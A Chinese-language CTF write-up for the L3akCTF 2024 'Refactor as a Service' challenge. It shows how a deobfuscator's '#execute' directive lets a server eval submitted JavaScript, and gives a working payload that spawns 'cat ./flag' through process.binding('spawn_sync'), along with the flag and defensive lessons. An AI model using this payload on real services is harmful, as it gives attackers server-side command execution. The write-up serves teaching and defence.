# L3akCTF 2024 Refactor as a Service Writeup

## 题目简述

远程服务接收 Base64 编码的 JavaScript，把解码结果交给 npm 包 `not-a-real-refactoring-tool` 的 `deobfuscate` 函数，再打印“重构”后的代码。比赛时这是盲题，但向服务发送非法 JavaScript 会回显完整栈：

```text
.../node_modules/not-a-real-refactoring-tool/dist/index.js
.../node_modules/shift-parser/dist/tokenizer.js
```

由此可以确定后端依赖。该重构工具为了还原混淆函数，提供了一个危险的 `#execute` 指令：带此 directive 的函数会在重构进程内通过 `eval` 执行。题目没有隔离或关闭该功能，因此形成服务端 JavaScript 代码执行。

## 解题过程

普通输入：

```javascript
console.log(1 + 1);
```

只会被静态折叠为 `console.log(2)`，不能证明代码已动态运行。真正的入口是函数体开头的 directive：

```javascript
function a() {
    '#execute';
    // 这里的函数体会被重构器执行
}
a();
```

Node.js 的 `child_process` 高层 API 不是唯一执行进程的方法。官方 payload 使用内部绑定 `process.binding("spawn_sync").spawn` 启动 `cat ./flag`，并从第二个输出管道取得 stdout：

```javascript
function a() {
    '#execute';
    let result = process.binding("spawn_sync").spawn({
        file: "cat",
        args: ["cat", "./flag"],
        stdio: [
            {type: "pipe", readable: true,  writable: false},
            {type: "pipe", readable: false, writable: true},
            {type: "pipe", readable: false, writable: true}
        ]
    });
    let output = result.output[1].toString();
    console.log(output);
}
a();
```

发送前做 Base64 编码即可：

```python
from base64 import b64encode

payload = b64encode(script.encode())
```

重构器在处理该函数时执行其中的系统调用，回显：

```text
L3AK{th4t_w4s_1nd33d_s0m3_fl4wl3ss_e3x3cu710n}
```

## 方法总结

- 盲服务发生异常时，栈路径、包名和版本线索足以恢复关键依赖；不应只观察正常输出。
- 反混淆、模板预览和“代码优化”工具常包含有意的求值功能。输入即使只被承诺“重写”，也应追踪所有 `eval`、动态导入和子进程路径。
- 根本修复不是过滤 `#execute` 字样，而是不要在处理不可信代码的进程中启用函数求值；若业务必须求值，应使用权限最小化、一次性且无秘密文件的隔离环境。
